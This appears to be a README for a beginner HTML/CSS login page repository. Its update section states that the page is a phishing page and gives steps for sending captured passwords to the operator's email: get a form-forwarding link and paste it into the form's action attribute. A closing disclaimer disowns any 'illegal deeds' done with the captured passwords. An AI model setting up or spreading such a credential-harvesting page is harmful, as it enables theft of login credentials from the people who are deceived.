# HTML-and-CSS-only
Making an login page just with HTML and CSS further would be updated
Intial web development projects using html and CSS
This is my first project in html using CSS.
Feel free to make to changes in my code.
# UPDATE
* Now the input fields accept submissions.
* The login page is a phishing page,it sends the data to email.
* To get responses on your email,do the following:
* go to flipmail.com and enter your email to get a link.
* copy that link and edit the following line of code in index.html<br>
``` <form method="POST" action="PASTE URL HERE"> ```
* paste your flipmail link in action field and it will start sending responses to your email address.
* I am not responsible for any illegal deeds done by you after getting password through this phishing page.
* I created this for the purpose of learning form inputs.
